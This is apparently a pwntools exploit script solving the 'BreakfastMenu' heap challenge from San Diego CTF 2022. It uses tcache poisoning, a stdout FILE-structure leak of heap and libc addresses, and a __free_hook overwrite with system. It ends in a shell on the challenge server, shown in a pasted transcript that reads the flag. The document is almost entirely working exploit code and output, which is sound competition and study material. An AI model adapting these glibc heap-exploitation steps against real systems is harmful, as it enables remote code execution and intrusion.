from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './BreakfastMenu'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "breakfast.sdc.tf"
  PORT = 1337
  s = remote(HOST, PORT)
  heap_offset = 0x2300
else:
  s = process(BINARY)
  heap_offset = 0x1700
libc = elf.libc

def Create():
  s.sendlineafter("leave\n", "1")

def Edit(idx, data):
  s.sendlineafter("leave\n", "2")
  s.sendlineafter("modify\n", str(idx))
  s.sendlineafter("order?\n", data)

def Delete(idx):
  s.sendlineafter("leave\n", "3")
  s.sendlineafter("remove\n", str(idx))

for i in range(6):
  Create()

# Make fake chunk sizeof 0x3c1 for heap leaking
Delete(4)
Delete(5)
Edit(5, "\x00")
Create()
Create()
Edit(2, "A"*0x18+p64(0x3c1))

# Heap leak
Delete(7)
Edit(-12, p32(0xfbad3a87)+"\x01"*0x1b)

s.recvuntil("\x00"*0x20)
heap_leak = u64(s.recv(8))
heap_base = heap_leak - heap_offset
print "heap_leak =", hex(heap_leak)
print "heap_base =", hex(heap_base)

# Make large chunk in tcache
Delete(0)
Delete(1)
Edit(1, p64(heap_base + 0x210))
Create()
Create()
Edit(9, "A"*8+p64(heap_offset - 0x300 + 0x61))

Delete(0)
Delete(1)
Edit(1, p64(heap_base + 0x220))
Create()
Create()

# libc leak
Delete(11)
Edit(-12, p32(0xfbad3a87)+"\x01"*0x1b)
s.recvuntil("A"*8)
s.recv(8)
libc_leak = u64(s.recv(8))
libc_base = libc_leak - libc.sym.__malloc_hook - 0x70
free_hook   = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
print "libc_leak =", hex(libc_leak)
print "libc_base =", hex(libc_base)

# Write __free_hook in tcache
Delete(0)
Delete(1)
Edit(1, p64(free_hook))

# Write system address in __free_hook
Create()
Create()
Edit(13, p64(system_addr))

# Start system("/bin/sh")
Edit(3, "/bin/sh\x00")
Delete(3)

s.interactive()

'''
mito@ubuntu:~/CTF/San_Diego_CTF_2022/Pwn_Breakfast_Menu_250$ python solve.py r
[*] '/home/mito/CTF/San_Diego_CTF_2022/Pwn_Breakfast_Menu_250/BreakfastMenu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to breakfast.sdc.tf on port 1337: Done
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
heap_leak = 0x880300
heap_base = 0x87e000
libc_leak = 0x7fc8441e3ca0
libc_base = 0x7fc843df8000
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 28
-rwxr-xr-x 1 nobody nogroup 13000 May  6 22:02 BreakfastMenu
-rw-r--r-- 1 nobody nogroup  2405 May  5 18:23 BreakfastMenu.c
-rw-r--r-- 1 nobody nogroup   105 Apr 29 20:55 Makefile
-rw-r--r-- 1 nobody nogroup    42 May  6 22:01 flag.txt
$ cat flag.txt
sdctf{Th3_m05t_1Mp0Rt4nT_m34L_0f_th3_d4Y}
'''
